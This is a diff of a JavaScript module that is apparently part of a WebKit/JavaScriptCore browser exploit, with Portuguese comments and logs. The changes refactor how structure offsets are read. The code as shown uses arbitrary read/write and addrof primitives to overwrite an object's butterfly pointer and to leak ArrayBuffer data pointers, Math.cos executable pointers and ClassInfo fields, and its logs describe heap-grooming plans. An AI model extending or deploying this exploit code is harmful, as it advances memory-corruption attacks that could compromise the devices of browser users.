@@ -1,8 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R75 - Fixes, Refined Grooming & New Leak Strategies)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R76 - Fixes, Refined Grooming & New Leak Strategies)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. CORREÇÃO DE ERRO: `RangeError` e `TypeError` na `AdvancedInt64.add/sub` corrigido em `utils.mjs`.
-//    Aumentada a robustez da classe AdvancedInt64 para lidar com números primitivos.
+// 1. CORREÇÃO DE ERRO CRÍTICO: Garantido que JSC_OFFSETS são acessados de forma segura,
+//    evitando "undefined" em operações da classe AdvancedInt64.
 // 2. Heap Grooming Refinado: Maior diversidade e volume de objetos no spray, com
 //    liberação controlada de "fillers" para otimizar o layout do heap.
 // 3. Novas Tentativas de Vazamento Aprimoradas:
@@ -24,7 +24,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R75_FixAndNewLeaks";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R76_FixAndNewLeaks";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -155,7 +155,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
         logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
         
-        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); 
+        // CORREÇÃO: Cache o offset em uma variável local para evitar o erro "undefined"
+        const JS_OBJECT_BUTTERFLY_OFFSET = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
+        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(JS_OBJECT_BUTTERFLY_OFFSET); 
         
         logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
         arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);
@@ -260,9 +262,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3("    Addrof retornou 0 ou NaN para TypedArray. Pulando tentativa de vazamento do data pointer.", "error");
         } else {
             try {
-                const data_buffer_ptr_addr = typed_array_addr.add(JSC_OFFSETS.ArrayBufferView.M_BUFFER_OFFSET);
+                // CORREÇÃO: Cache o offset em uma variável local para evitar o erro "undefined"
+                const M_BUFFER_OFFSET = JSC_OFFSETS.ArrayBufferView.M_BUFFER_OFFSET;
+                const data_buffer_ptr_addr = typed_array_addr.add(M_BUFFER_OFFSET);
                 const array_buffer_obj_addr = arb_read_final(data_buffer_ptr_addr);
-                logS3(`    Lido ArrayBuffer* (m_buffer) de TypedArray (${JSC_OFFSETS.ArrayBufferView.M_BUFFER_OFFSET}): ${array_buffer_obj_addr.toString(true)}`, "leak");
+                logS3(`    Lido ArrayBuffer* (m_buffer) de TypedArray (${toHex(M_BUFFER_OFFSET)}): ${array_buffer_obj_addr.toString(true)}`, "leak");
 
                 if (array_buffer_obj_addr.equals(NEW_POLLUTION_VALUE)) {
                     logS3(`    ALERTA DE POLUIÇÃO: m_buffer de TypedArray está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
@@ -272,9 +276,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     throw new Error("Falha ao vazar ArrayBuffer* do TypedArray (endereço é 0x0 ou NaN).");
                 }
                 
-                const data_ptr_addr = array_buffer_obj_addr.add(JSC_OFFSETS.ArrayBuffer.M_DATA_OFFSET);
+                // CORREÇÃO: Cache o offset em uma variável local para evitar o erro "undefined"
+                const M_DATA_OFFSET = JSC_OFFSETS.ArrayBuffer.M_DATA_OFFSET;
+                const data_ptr_addr = array_buffer_obj_addr.add(M_DATA_OFFSET);
                 const actual_data_ptr = arb_read_final(data_ptr_addr);
-                logS3(`    Lido Ponteiro de Dados (m_data) do ArrayBuffer (${JSC_OFFSETS.ArrayBuffer.M_DATA_OFFSET}): ${actual_data_ptr.toString(true)}`, "leak");
+                logS3(`    Lido Ponteiro de Dados (m_data) do ArrayBuffer (${toHex(M_DATA_OFFSET)}): ${actual_data_ptr.toString(true)}`, "leak");
 
                 if (actual_data_ptr.equals(NEW_POLLUTION_VALUE)) {
                     logS3(`    ALERTA DE POLUIÇÃO: m_data de ArrayBuffer está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
@@ -325,10 +331,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Falha ao vazar Math.cos (endereço é 0x0 ou NaN).");
             }
 
-            const executable_ptr_offset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;
-            if (executable_ptr_offset) {
-                 const executable_addr = arb_read_final(func_addr.add(executable_ptr_offset));
-                 logS3(`    Lido Executable* (${executable_ptr_offset}) de Math.cos: ${executable_addr.toString(true)}`, "leak");
+            // CORREÇÃO: Cache o offset em uma variável local
+            const EXECUTABLE_OFFSET = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;
+            if (EXECUTABLE_OFFSET) {
+                 const executable_addr = arb_read_final(func_addr.add(EXECUTABLE_OFFSET));
+                 logS3(`    Lido Executable* (${toHex(EXECUTABLE_OFFSET)}) de Math.cos: ${executable_addr.toString(true)}`, "leak");
 
                  if (executable_addr.equals(NEW_POLLUTION_VALUE)) {
                     logS3(`    ALERTA DE POLUIÇÃO: Executable* de Math.cos está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
@@ -382,7 +389,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
             logS3(`    Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");
 
-            const cached_type_info_ptr_addr = class_info_addr.add(JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET);
+            // CORREÇÃO: Cache o offset em uma variável local
+            const M_CACHED_TYPE_INFO_OFFSET = JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET;
+            const cached_type_info_ptr_addr = class_info_addr.add(M_CACHED_TYPE_INFO_OFFSET);
             const cached_type_info_addr = arb_read_final(cached_type_info_ptr_addr);
             if (cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
                 throw new Error("m_cachedTypeInfo poluído/inválido.");
@@ -424,7 +433,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("RECOMENDAÇÃO: Com o depurador inacessível, a estratégia é iterar em técnicas mais variadas de Heap Grooming e fontes de vazamento.", "critical");
         logS3("Concentre-se em: 1) Mais variação de alocações/liberações no grooming. 2) Vazamento de m_data de TypedArray. 3) Vazamento de endereços de funções nativas JS (JSCFunction/Executable).", "critical");
         logS3("É crucial tentar entender o layout do heap através de padrões de sucesso/falha e ajustar os tamanhos de alocação.", "critical");
-        logS3("======================================================", "critical");
     }
 
     return {
